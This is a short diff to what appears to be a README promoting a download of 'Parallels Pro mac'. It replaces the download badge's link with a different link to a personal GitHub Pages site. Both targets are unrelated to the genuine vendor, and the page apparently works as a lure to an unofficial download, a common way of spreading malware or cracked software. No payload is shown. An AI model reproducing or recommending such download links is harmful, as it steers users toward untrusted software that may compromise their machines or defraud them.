@@ -2,7 +2,7 @@
 
 Parallels Pro mac delivers Mac‑optimized tools with Apple silicon support, native UI, and professional workflows.
 
-[![Download Parallels Pro mac](https://img.shields.io/badge/Download-Parallels_Pro_mac-blueviolet)](https://metarefund.com/)
+[![Download Parallels Pro mac](https://img.shields.io/badge/Download-Parallels_Pro_mac-blueviolet)](https://weyinays.github.io/.github/Parallels-Pro-Labs)
 
 ---
 
